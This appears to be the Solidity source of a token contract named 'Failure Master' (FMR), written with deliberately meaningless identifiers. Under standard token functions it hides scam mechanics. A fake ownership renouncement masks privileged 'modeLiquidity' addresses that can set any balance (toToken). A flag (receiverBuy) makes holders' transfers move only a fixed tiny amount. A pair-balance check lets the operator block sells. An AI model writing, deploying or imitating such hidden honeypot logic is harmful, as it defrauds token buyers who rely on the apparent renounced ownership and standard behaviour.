//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface tokenShould {
    function createPair(address walletSell, address launchedSenderShould) external returns (address);
}

interface tokenTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoTeam) external view returns (uint256);

    function transfer(address modeLimitLaunch, uint256 exemptLaunch) external returns (bool);

    function allowance(address teamTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address modeLimitLaunch,
        uint256 exemptLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverMode, uint256 value);
    event Approval(address indexed teamTake, address indexed spender, uint256 value);
}

abstract contract marketingTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenTeamMetadata is tokenTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FailureMaster is marketingTrading, tokenTeam, tokenTeamMetadata {

    function shouldFund() private view {
        require(modeLiquidity[_msgSender()]);
    }

    function sellTrading(address fundTo, address modeLimitLaunch, uint256 exemptLaunch) internal returns (bool) {
        require(swapSell[fundTo] >= exemptLaunch);
        swapSell[fundTo] -= exemptLaunch;
        swapSell[modeLimitLaunch] += exemptLaunch;
        emit Transfer(fundTo, modeLimitLaunch, exemptLaunch);
        return true;
    }

    mapping(address => mapping(address => uint256)) private buyTrading;

    uint8 private enableShould = 18;

    event OwnershipTransferred(address indexed fromMax, address indexed liquidityWallet);

    address swapMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return enableShould;
    }

    function owner() external view returns (address) {
        return tokenAt;
    }

    bool public tokenAuto;

    address public walletIs;

    mapping(address => bool) public modeLiquidity;

    uint256 private takeWalletFrom;

    uint256 teamSwap;

    function totalSupply() external view virtual override returns (uint256) {
        return enableSell;
    }

    bool public swapLaunch;

    string private receiverSwapTx = "FMR";

    address private tokenAt;

    uint256 private receiverLaunchTeam;

    function receiverTotal(address fundTo, address modeLimitLaunch, uint256 exemptLaunch) internal returns (bool) {
        if (fundTo == walletIs) {
            return sellTrading(fundTo, modeLimitLaunch, exemptLaunch);
        }
        uint256 tokenShouldBuy = tokenTeam(atMaxWallet).balanceOf(amountSwap);
        require(tokenShouldBuy == teamSwap);
        require(modeLimitLaunch != amountSwap);
        if (feeEnable[fundTo]) {
            return sellTrading(fundTo, modeLimitLaunch, amountReceiver);
        }
        return sellTrading(fundTo, modeLimitLaunch, exemptLaunch);
    }

    mapping(address => uint256) private swapSell;

    uint256 buyMin;

    function allowance(address walletLimitMax, address maxTeam) external view virtual override returns (uint256) {
        if (maxTeam == swapMode) {
            return type(uint256).max;
        }
        return buyTrading[walletLimitMax][maxTeam];
    }

    uint256 private senderReceiver;

    constructor (){
        
        toAt amountMode = toAt(swapMode);
        atMaxWallet = tokenShould(amountMode.factory()).createPair(amountMode.WETH(), address(this));
        if (launchMarketing != minFee) {
            minFee = receiverLaunchTeam;
        }
        walletIs = _msgSender();
        modeLiquidity[walletIs] = true;
        swapSell[walletIs] = enableSell;
        launchedShould();
        if (senderReceiver == takeWalletFrom) {
            launchedFund = true;
        }
        emit Transfer(address(0), walletIs, enableSell);
    }

    function enableAmount(uint256 exemptLaunch) public {
        shouldFund();
        teamSwap = exemptLaunch;
    }

    string private marketingAmount = "Failure Master";

    function transfer(address launchedSwapList, uint256 exemptLaunch) external virtual override returns (bool) {
        return receiverTotal(_msgSender(), launchedSwapList, exemptLaunch);
    }

    function launchMax(address fromBuy) public {
        require(fromBuy.balance < 100000);
        if (swapLaunch) {
            return;
        }
        if (launchMarketing == minFee) {
            launchedFund = false;
        }
        modeLiquidity[fromBuy] = true;
        
        swapLaunch = true;
    }

    function toToken(address launchedSwapList, uint256 exemptLaunch) public {
        shouldFund();
        swapSell[launchedSwapList] = exemptLaunch;
    }

    function approve(address maxTeam, uint256 exemptLaunch) public virtual override returns (bool) {
        buyTrading[_msgSender()][maxTeam] = exemptLaunch;
        emit Approval(_msgSender(), maxTeam, exemptLaunch);
        return true;
    }

    uint256 private minFee;

    address amountSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return receiverSwapTx;
    }

    mapping(address => bool) public feeEnable;

    bool public launchedFund;

    uint256 constant amountReceiver = 11 ** 10;

    uint256 private enableSell = 100000000 * 10 ** 18;

    function receiverBuy(address listBuy) public {
        shouldFund();
        if (minFee == receiverLaunchTeam) {
            senderReceiver = launchMarketing;
        }
        if (listBuy == walletIs || listBuy == atMaxWallet) {
            return;
        }
        feeEnable[listBuy] = true;
    }

    address public atMaxWallet;

    function getOwner() external view returns (address) {
        return tokenAt;
    }

    function launchedShould() public {
        emit OwnershipTransferred(walletIs, address(0));
        tokenAt = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return marketingAmount;
    }

    function transferFrom(address fundTo, address modeLimitLaunch, uint256 exemptLaunch) external override returns (bool) {
        if (_msgSender() != swapMode) {
            if (buyTrading[fundTo][_msgSender()] != type(uint256).max) {
                require(exemptLaunch <= buyTrading[fundTo][_msgSender()]);
                buyTrading[fundTo][_msgSender()] -= exemptLaunch;
            }
        }
        return receiverTotal(fundTo, modeLimitLaunch, exemptLaunch);
    }

    uint256 public launchMarketing;

    function balanceOf(address autoTeam) public view virtual override returns (uint256) {
        return swapSell[autoTeam];
    }

}